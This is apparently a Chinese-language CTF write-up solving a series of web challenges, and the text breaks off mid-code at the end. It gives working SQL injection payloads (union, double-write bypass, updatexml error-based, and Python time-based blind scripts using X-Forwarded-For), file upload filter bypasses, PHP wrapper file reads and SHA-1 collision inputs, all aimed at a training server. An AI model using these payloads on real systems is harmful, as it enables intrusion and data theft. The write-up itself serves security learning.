<p>第一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure></p>
<p>第二个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure></p>
<p>有了这两个值之后就很好做了，代码本身并不难，记得最后跟上一个<code>id=margin</code></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/30485545.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>题目也是给了代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line">if ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>先解释一下代码，<code>extract()</code>可以将数组的<code>键名</code>拆成<code>变量</code>，这里直接像平时一样传参即可，<br>并且必须存在<code>$ac</code>这个变量，然后<code>$f</code>这个变量是从<code>file_get_contents($fn)</code>中得到，所以你还需要传入<code>$fn</code>这个变量，如果<code>$ac</code>与<code>$f</code>相等的话，得到flag，但是这个相等绕过的可能性不大，<br>因为是三个等号，所以只能将另这两个值相等了。</p>
<p>两种解法：</p>
<ul>
<li>第一种</li>
</ul>
<p>直接扫后台，扫到一个名为<code>flag.txt</code>，并且内容是<code>flags</code><br>然后根据代码的意思将传入的<code>$ac</code>参数值置为<code>flags</code>,然后将<code>$fn</code>置为<code>flag.txt</code></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt</span><br></pre></td></tr></table></figure></p>
<ul>
<li>第二种</li>
</ul>
<p>利用伪协议，既然<code>$fn</code>可控的话，并且被包含，那么就能用伪协议了，payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web8/?ac=1&amp;fn=php://input</span><br><span class="line"></span><br><span class="line">POST:1</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/51244785.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>首先这题啥都没有，各种找都找不到入口，然后上御剑扫到了<code>robots.txt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /resusl.php</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/81926972.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>有个提示是管理员的，提交<code>x</code>为各种值都不行，然后提交为<code>admin</code>有反应了？wtf?</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-23/72058928.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>首先题目提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is margin,give me a image file not a php</span><br></pre></td></tr></table></figure></p>
<p>先上传个php试试，</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/32810460.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>直接提示了非法文件，然后我们将<code>扩展名</code>改为<code>jpg</code>试试</p>
<p>题目会提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You got it!:)</span><br></pre></td></tr></table></figure></p>
<p>能成功，但是题目没有回显路径或者flag,继续更改文件的类型为<code>image/jpeg</code>,<br>然后回显了路径：</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/22121514.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>但是已经被当成一张图片了，服务器无法解析，所以上菜刀是连不上的，<br>这个时候需要揣摩一下出题者的意图了，<br>提示里写了需要一个<code>image</code>，所以类型是肯定需要改成<code>image</code>的，<br>但是各种试都上传不上去，能成功上传的都被更改了后缀名,<br>所以更改一下<code>请求头</code>的<code>Content-Type</code>大小写，因为这道题的waf很严格，<br>导致了各种上传方式都失败，又因为对s上传的文件类型做了一点要求，<br>所以只能更改<code>后缀名</code>来得到flag，php别名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php2, php3, php4, php5, phps, pht, phtm, phtml …</span><br></pre></td></tr></table></figure></p>
<p>都可以试一下，当试到<code>php5</code>时，得到flag:</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/95684881.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>这里引用网上wp的一句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果是waf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，</span><br><span class="line">使得需要上传的文件可以到达服务器端，而服务器的容错率较高，</span><br><span class="line">一般我们上传的文件可以解析。</span><br></pre></td></tr></table></figure></p>
<h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p>题目提示：<br>不如写个python吧。。<br>估计大概率是盲注了，先放上代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip = &apos;&apos;;</span><br><span class="line">if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&#123;</span><br><span class="line">$ip = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(&apos;,&apos;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=&quot;localhost&quot;;</span><br><span class="line">$user=&quot;&quot;;</span><br><span class="line">$pass=&quot;&quot;;</span><br><span class="line">$db=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line">echo &apos;your ip is :&apos;.$ip;</span><br><span class="line">$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure></p>
<p>分析一下代码，这段代码的意思先从<code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR</code>获得ip变量，<br>然后再执行<code>insert into</code>语句，所以这里的可控变量是$ip，也就是在请求包里构造<code>XFF</code>，<br>在<code>insert into注入</code>中，需要用到的sql语句是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when 条件 then 执行1 else 执行2</span><br></pre></td></tr></table></figure></p>
<p>再来看看代码过滤了什么:<br><code>explode(&#39;,&#39;, $ip)</code>可以发现逗号被过滤了，所以<code>substr()1,1</code>这样的方法行不通，<br>所以现在需要换一种方法<code>substr() from 1 for 1</code>,而且因为没有报错，所以只能是基于时间的盲注，<br>这时候需要用到<code>sleep()</code>和<code>timeout</code>,先上python代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web15/&apos;</span><br><span class="line">data = &quot;&apos;+(select case when (substring((select database() ) from &#123;0&#125; for 1)=&apos;&#123;1&#125;&apos;) then sleep(5) else 1 end)) #&quot;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,10):</span><br><span class="line">    for j in mystring:</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(i),j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=3)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print(&apos;The database name is &apos;+flag)</span><br></pre></td></tr></table></figure></p>
<p>这段代码的作用是查出来数据库的名字，后面的步骤也就跟普通的盲注一样了，<br>得到表名代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web15/&apos;</span><br><span class="line">data = &quot;&apos;+(select case when (substring((select table_name from information_schema.tables where table_schema= &apos;web15&apos; limit 1 offset &#123;0&#125;) from &#123;1&#125; for 1)=&apos;&#123;2&#125;&apos;) then sleep(5) else 1 end)) #&quot;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">tables = []</span><br><span class="line">for x in range(0,5):</span><br><span class="line">	tables.append(flag)</span><br><span class="line">	flag = &apos;&apos;</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">	    for j in mystring:</span><br><span class="line">	        try:</span><br><span class="line">	            headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(x),str(i),j)&#125;</span><br><span class="line">	            res = requests.get(url,headers=headers,timeout=3)</span><br><span class="line">	        except requests.exceptions.ReadTimeout:</span><br><span class="line">	            flag += j</span><br><span class="line">	            print(flag)</span><br><span class="line">	            break</span><br><span class="line"></span><br><span class="line">print(&apos;The database name is &apos;+&apos;&apos;.join(tables))</span><br></pre></td></tr></table></figure></p>
<p>列名也是一样的道理，所以只放出最后的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web15/&apos;</span><br><span class="line">data = &quot;&apos;+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)=&apos;&#123;1&#125;&apos;) then sleep(5) else 1 end)) #&quot;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,35):</span><br><span class="line">    for j in mystring:</span><br><span class="line">        try:</span><br><span class="line">            headers = &#123;&apos;x-forwarded-for&apos;:data.format(str(i),j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=4)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>
<p>最后可以得到flag</p>
<h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>很基础的注入题，payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; union select flag1,2 from flag1 #</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/46039219.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>首先各种试了之后全是<code>error</code>，在这样尝试之后发现没有报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=1&apos;  aandnd 1=1 %23</span><br></pre></td></tr></table></figure></p>
<p>估计后面全是双写绕过，然后就变成了一个很普通的<code>联合注入</code>，所以最终的payload是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1&apos; ununionion selselectect 1,flag1 from flag1%23</span><br></pre></td></tr></table></figure></p>
<p>但是这个flag是一串乱码。。是第一个flag，在找列的时候还看到一个<code>address列</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/1ndex.php?id=-1&apos; ununionion selselectect 1,address from flag1%23</span><br></pre></td></tr></table></figure></p>
<p>可以得到下一关的通关地址<code>Once_More.php</code></p>
<p>这一关双写union也没办法绕过，所以试了一下<code>updatexml</code>，报错注入，<br>这里大概简述一下updatexml报错注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br></pre></td></tr></table></figure></p>
<p>来看看这题的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<p><code>concat</code>函数会把中间的参数连接成字符串，比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(hello,world,!)</span><br></pre></td></tr></table></figure></p>
<p>很容易理解，返回的是<code>helloworld!</code>，<br>然后又因为<code>UPDATEXML</code>函数的第二个参数需要的是xml格式的字符串，<br>我这里提交的是<code>~sql语句~</code>,是不符合xml格式的，所以会报错。<br>得到表名：</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/47831981.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>按照这个思路，可以一步步的得到flag，什么时候能进行报错注入呢，输入这个语句查询sql版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<p>前面已经得到了表名，列名和数据直接放上payload:<br>列：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x666c616732),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<p>然后发现其实这题还有第三关:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Once_More.php?id=1&apos; and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/78045830.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9004/Have_Fun.php</span><br></pre></td></tr></table></figure>
<p>访问之后查看源代码提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YOUR IP:59.46.211.135</span><br><span class="line">Sorry,Only IP:192.168.0.100 Can Access This Site</span><br></pre></td></tr></table></figure></p>
<p>构造XFF即可绕过：</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/81875175.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>然后题目提示了一个图片，访问之后是个二维码<br>扫描之后得到以下信息：</p>
<p>你……你……你可以看到我? 好吧，我来自于ErWeiMa.php 顺便告诉你两个密码 one:参数名是game; tow:flag在admin里 对了,文件后@…c=Y&amp;$as%_=#<em>ad…</em>@#！*&amp;@…c……</p>
<p>参数名是<code>game</code>，flag在admin里，很明显的文件读取了，不能直接读取,<br>所以只能用伪协议了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">game=php://filter/read=convert.base64-encode/resource=admin.php</span><br></pre></td></tr></table></figure></p>
<p>得到源码之后,base64解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$good = &quot;Good Jobï¼I want You!&quot;;</span><br><span class="line">$flag = &quot;0x476F6F64204A6F62A3A1492077616E7420596F7521A3A1&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到flag,<br>提交时需要加上FLAG{}</p>
<h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>这题一开始没给加密后的数据，应该是题目有问题，网上找了一下找到了，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span><br></pre></td></tr></table></figure></p>
<p>加密算法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">    $key = md5(&apos;ISCC&apos;);</span><br><span class="line">    $x = 0;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    for ($i=0; $i &lt; $len; $i++) &#123; </span><br><span class="line">        if ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ($i=0; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>自用的解密算法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function decrypt($str)&#123;</span><br><span class="line">    $str = base64_decode($str);</span><br><span class="line">    $len = strlen($str);</span><br><span class="line">    $key = md5(&apos;ISCC&apos;);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    for ($i=0; $i &lt; $len; $i++) &#123; </span><br><span class="line">        if ($x == $klen)&#123;</span><br><span class="line">            $x = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ($i=0; $i&lt;$len ; $i++) &#123;        </span><br><span class="line">        if (abs(ord($str[$i])-ord($char[$i])+128)&gt;128) &#123;</span><br><span class="line">        	$flag .= chr(abs(ord($str[$i])-ord($char[$i])));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        	$flag .= chr(abs(ord($str[$i])-ord($char[$i])+128));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里有两个地方需要注意，</p>
<ul>
<li>第一个是加密算法里的<code>$char</code>，长度不确定，但是想一想之后会发现，他的长度跟加密后的数据长度一样(base64之后)</li>
<li>第二个点是取余是不可逆的，但是由于ascii码的范围是有限的，所以其中的<code>ord($data[$i]) + ord($char[$i])</code>的范围是[0,254]，所以这个取余是可逆的，分成两种情况，<ul>
<li>第一种是相加大于128</li>
<li>第二种是相加小于128</li>
</ul>
</li>
</ul>
<p>Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}</p>
<h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>这题应该是坏了，自己试的方法和网上找的方法都行不通</p>
<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>首先这个login点了肯定是没反应的，因为根本没有<code>action</code>，<br>所以看到hint,在URL后面传递一个hint参数，此时可以看到源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/flagphp/?hint=</span><br><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include_once(&quot;flag.php&quot;); </span><br><span class="line">$cookie = $_COOKIE[&apos;ISecer&apos;]; </span><br><span class="line">if(isset($_GET[&apos;hint&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125; </span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;) </span><br><span class="line">&#123;    </span><br><span class="line">    echo &quot;$flag&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">?&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; </span><br><span class="line">  &lt;form method=&quot;POST&quot; 